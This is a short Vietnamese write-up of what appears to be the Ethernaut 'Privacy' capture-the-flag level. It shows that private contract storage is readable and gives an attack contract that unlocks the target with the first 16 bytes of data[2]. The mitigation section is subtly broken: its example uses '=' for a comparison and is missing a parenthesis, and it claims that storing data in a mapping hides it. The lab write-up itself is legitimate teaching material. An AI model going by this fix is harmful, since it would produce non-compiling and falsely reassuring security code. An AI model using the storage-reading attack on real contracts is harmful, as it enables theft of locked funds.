### Kết luận
- Lỗ hổng: Dữ liệu trong storage của hợp đồng không được mã hóa và có thể được đọc bằng cách sử dụng các công cụ như:
+ `web3.eth.getStorageAt` (truy cập trực tiếp vào các slot lưu trữ).
+ `Remix IDE` (chức năng debug và đọc storage).
- Cách phòng tránh: Sử dụng `mapping` để lưu trữ dữ liệu thay vì mảng trực tiếp, Không lưu trữ dữ liệu nhạy cảm trực tiếp trong `storage`
- Hoặc có thể lưu giá trị hash.
- VD:
```solidity
bytes32 private secrectKey;
function unlock(bytes16 _key) public {
    require(keccak256(abi.encodePacked(_key) = secrectKey, "...");
//....
}
```
- VD về Contract tấn công:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IPrivacy{
    function unlock(bytes16 _key) external;
}
contract PrivacyAttack{
    IPrivacy victim;
    constructor (address challenge){
        victim = IPrivacy(challenge);
    }
    function attack(bytes32 fullkey) external{
        bytes16 key = bytes16(fullkey); 
        // Do key trong hop dong pivacy lay 16 byte dau
        // cuar data[2]
        victim.unlock(key);
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
